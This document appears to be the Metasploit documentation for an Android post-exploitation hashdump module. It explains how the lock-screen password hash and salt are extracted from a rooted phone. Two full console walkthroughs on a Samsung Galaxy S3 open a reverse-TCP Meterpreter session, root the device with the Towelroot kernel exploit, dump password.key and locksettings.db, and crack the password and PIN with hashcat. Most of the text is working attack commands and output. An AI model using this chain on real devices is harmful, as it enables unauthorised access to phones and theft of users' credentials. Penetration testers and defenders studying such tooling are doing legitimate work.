## Description

Post Module to dump the password hashes for Android System. Root is required.
To perform this operation, two things are needed.  First, a password.key file
is required as this contains the hash but no salt.  Next, a sqlite3 database
is needed (with supporting files) to pull the salt from.  Combined, this
creates the hash we need.  This can be cracked with Hashcat, mode 5800.
Samsung devices only have SHA1 hashes, while most other Android devices
also have an MD5 hash.  

A PIN is simply an all digit password.  

A Pattern lock is also an all digit password where each dot is represented by a number.

```
1   2   3

4   5   6

7   8   9
```

## Verification Steps

  1. Get root on an Android device
  2. Start msfconsole
  3. Do: ```use post/android/gather/hashdump```
  4. Do: ```set session [session]```
  5. Do: ```run```
  6. You should get a password hash to crack.

## Scenarios

### Passworded - Samsung Galaxy S3 Verizon (SCH-I535 w/ android 4.4.2, kernel 3.4.0)

Using `towelroot` to get root.  Device is set to use Password as the screen lock.  Password is `test`.

```
resource (android.128.rb)> use exploit/multi/handler
resource (android.128.rb)> set payload android/meterpreter_reverse_tcp
payload => android/meterpreter_reverse_tcp
resource (android.128.rb)> set lport 9999
lport => 9999
resource (android.128.rb)> setg lhost 111.111.1.111
lhost => 111.111.1.111
resource (android.128.rb)> setg verbose true
verbose => true
resource (android.128.rb)> run
[*] Started reverse TCP handler on 111.111.1.111:9999 
[*] Meterpreter session 1 opened (111.111.1.111:9999 -> 222.222.2.222:42547) at 2019-10-27 20:48:49 -0400
WARNING: Local file /root/metasploit-framework/data/meterpreter/ext_server_stdapi.jar is being used
WARNING: Local files may be incompatible with the Metasploit Framework

meterpreter > background
[*] Backgrounding session 1...
resource (android.128.rb)> use towelroot

Matching Modules
================

   #  Name                                 Disclosure Date  Rank       Check  Description
   -  ----                                 ---------------  ----       -----  -----------
   0  exploit/android/local/futex_requeue  2014-05-03       excellent  Yes    Android 'Towelroot' Futex Requeue Kernel Exploit


[*] Using exploit/android/local/futex_requeue
resource (android.128.rb)> set session 1
session => 1
resource (android.128.rb)> run

[*] Started reverse TCP handler on 111.111.1.111:4444 
[+] Android version 4.4.2 appears to be vulnerable
[*] Found device: d2vzw
[*] Fingerprint: Verizon/d2vzw/d2vzw:4.4.2/KOT49H/I535VRUDNE1:user/release-keys
[*] Using target: New Samsung
[*] Loading exploit library /data/data/com.metasploit.stage/files/vnytm
[*] Loaded library /data/data/com.metasploit.stage/files/vnytm, deleting
[*] Waiting 300 seconds for payload
[*] Transmitting intermediate stager...(136 bytes)
[*] Sending stage (904600 bytes) to 222.222.2.222
[*] Meterpreter session 2 opened (111.111.1.111:4444 -> 222.222.2.222:51741) at 2019-10-27 20:49:34 -0400

meterpreter > background
[*] Backgrounding session 2...
resource (android.128.rb)> use post/android/gather/hashdump
resource (android.128.rb)> set session 2
session => 2
resource (android.128.rb)> run

[!] SESSION may not be compatible with this module.
[*] Attempting to determine unsalted hash
[+] Saved password.key
[*] Attempting to determine salt
[*] OS Version: 4.4.2
[*] Attempting to load >=4.3.0 Android settings file
[+] Saved locksettings.db with length 4096
[+] Saved locksettings.db-wal with length 140112
[+] Saved locksettings.db-shm with length 32768
[+] Password Salt: 4aafc54dc502e88b
[+] SHA1: EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b
[+] Crack with: hashcat -m 5800 EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b
[*] Post module execution completed
msf5 post(android/gather/hashdump) > creds
Credentials
===========

host  origin        service  public  private                                                    realm  private_type        JtR Format
----  ------        -------  ------  -------                                                    -----  ------------        ----------
      222.222.2.222                  EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b         Nonreplayable hash  android-sha1


```

We can now crack the password with hashcat as per the last line.

```
# hashcat -m 5800 EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b --show
ea8457de97836c955082ae77dbe2cd86a4e8bc0e:4aafc54dc502e88b:test
```

### PIN - Samsung Galaxy S3 Verizon (SCH-I535 w/ android 4.4.2, kernel 3.4.0)

Using `towelroot` to get root.  Device is set to use PIN as the screen lock.  Password is `1234`.

```
resource (android.128.rb)> use exploit/multi/handler
resource (android.128.rb)> set payload android/meterpreter_reverse_tcp
payload => android/meterpreter_reverse_tcp
resource (android.128.rb)> set lport 9999
lport => 9999
resource (android.128.rb)> setg lhost 111.111.1.111
lhost => 111.111.1.111
resource (android.128.rb)> setg verbose true
verbose => true
resource (android.128.rb)> run
[*] Started reverse TCP handler on 111.111.1.111:9999 
[*] Meterpreter session 1 opened (111.111.1.111:9999 -> 222.222.2.222:39987) at 2019-10-27 21:04:57 -0400
WARNING: Local file /root/metasploit-framework/data/meterpreter/ext_server_stdapi.jar is being used
WARNING: Local files may be incompatible with the Metasploit Framework

meterpreter > background
[*] Backgrounding session 1...
resource (android.128.rb)> use towelroot

Matching Modules
================

   #  Name                                 Disclosure Date  Rank       Check  Description
   -  ----                                 ---------------  ----       -----  -----------
   0  exploit/android/local/futex_requeue  2014-05-03       excellent  Yes    Android 'Towelroot' Futex Requeue Kernel Exploit


[*] Using exploit/android/local/futex_requeue
resource (android.128.rb)> set session 1
session => 1
resource (android.128.rb)> run

[*] Started reverse TCP handler on 111.111.1.111:4444 
[+] Android version 4.4.2 appears to be vulnerable
[*] Found device: d2vzw
[*] Fingerprint: Verizon/d2vzw/d2vzw:4.4.2/KOT49H/I535VRUDNE1:user/release-keys
[*] Using target: New Samsung
[*] Loading exploit library /data/data/com.metasploit.stage/files/rlotf
[*] Loaded library /data/data/com.metasploit.stage/files/rlotf, deleting
[*] Waiting 300 seconds for payload
[*] Transmitting intermediate stager...(136 bytes)
[*] Sending stage (904600 bytes) to 222.222.2.222
[*] Meterpreter session 2 opened (111.111.1.111:4444 -> 222.222.2.222:57268) at 2019-10-27 21:05:25 -0400

meterpreter > background
[*] Backgrounding session 2...
resource (android.128.rb)> use post/android/gather/hashdump
resource (android.128.rb)> set session 2
session => 2
resource (android.128.rb)> run

[!] SESSION may not be compatible with this module.
[*] Attempting to determine unsalted hash
[+] Saved password.key
[*] Attempting to determine salt
[*] OS Version: 4.4.2
[*] Attempting to load >=4.3.0 Android settings file
[+] Saved locksettings.db with length 4096
[+] Saved locksettings.db-wal with length 206032
[+] Saved locksettings.db-shm with length 32768
[+] Password Salt: 4aafc54dc502e88b
[+] SHA1: 9E201EFFCC29C8F54E1ECEC307CB1DA18B6B6E6B:4aafc54dc502e88b
[+] Crack with: hashcat -m 5800 9E201EFFCC29C8F54E1ECEC307CB1DA18B6B6E6B:4aafc54dc502e88b
[*] Post module execution completed

```
We can now crack the password with hashcat as per the last line.

```
# hashcat -m 5800 9E201EFFCC29C8F54E1ECEC307CB1DA18B6B6E6B:4aafc54dc502e88b -a 3 ?d?d?d?d
hashcat (v5.1.0) starting...

...

Approaching final keyspace - workload adjusted.  

9e201effcc29c8f54e1ecec307cb1da18b6b6e6b:4aafc54dc502e88b:1234
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Samsung Android Password/PIN
Hash.Target......: 9e201effcc29c8f54e1ecec307cb1da18b6b6e6b:4aafc54dc502e88b
Time.Started.....: Sun Oct 27 21:06:04 2019 (0 secs)
Time.Estimated...: Sun Oct 27 21:06:04 2019 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    41481 H/s (0.31ms) @ Accel:32 Loops:15 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1000/10000 (10.00%)
Rejected.........: 0/1000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1020-1023
Candidates.#1....: 1234 -> 1764
Hardware.Mon.#1..: Temp: 54c Util:100% Core: 705MHz Mem:1400MHz Bus:16

Started: Sun Oct 27 21:06:00 2019
Stopped: Sun Oct 27 21:06:05 2019
```
